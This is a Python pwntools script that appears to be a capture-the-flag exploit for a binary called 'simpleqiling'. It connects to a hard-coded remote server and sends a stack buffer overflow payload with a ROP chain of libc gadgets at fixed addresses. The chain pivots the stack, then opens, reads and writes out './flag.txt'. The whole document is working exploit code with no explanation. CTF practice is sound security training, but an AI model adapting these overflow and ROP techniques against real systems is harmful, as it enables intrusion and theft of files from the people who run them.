#!/usr/bin/env python3
from pwn import *

libc = ELF('./libc-2.31.so',checksec=False)
context.binary = exe = ELF('./simpleqiling',checksec=False)

def GDB():
    gdb.attach(p,gdbscript = '''
    c
    ''')
    input()
# p = process(["python3", "qi.py", "simpleqiling"])
p = remote("103.163.24.78",10010)
exe.address  =  0x555555554000
libc.address =  0x7fffb7dd6000

RDI = libc.address + 0x0000000000023b6a
RSI = libc.address + 0x000000000002601f
RDX = libc.address + 0x0000000000142c92
ret = libc.address + 0x0000000000022679
xchg = libc.address + 0x00000000000f1b65
RAX = libc.address + 0x0000000000036174
syscall = libc.address + 0x00000000000630a9
RSP = libc.address + 0x000000000002f70a
payload = flat(
    b"a"*0x28,
    0x6161616161616100,
    0x00000555555558500,
    RDI,0x000005555555585a0,
    libc.sym['gets'],
    RDI,0x000005555555585a0,
    libc.sym['puts'],
    RSP,0x000005555555585a0 + 0x10 + 0x100,
)
# GDB()
p.sendline(payload)
payload = flat(
    b"./flag.txt",b"\x00"*6,
    b"a"*0x100,
    RDI,0x000005555555585a0,
    RSI,0,RDX,0,
    libc.sym['open'],
    xchg,
    RSI,0x00000555555558500,
    RDX,0x100,
    libc.sym['read'],
    RSI,0x00000555555558500,
    RDX,0x100,
    RDI,1,
    libc.sym['write']
)
sleep(1)
p.sendline(payload)

p.interactive()




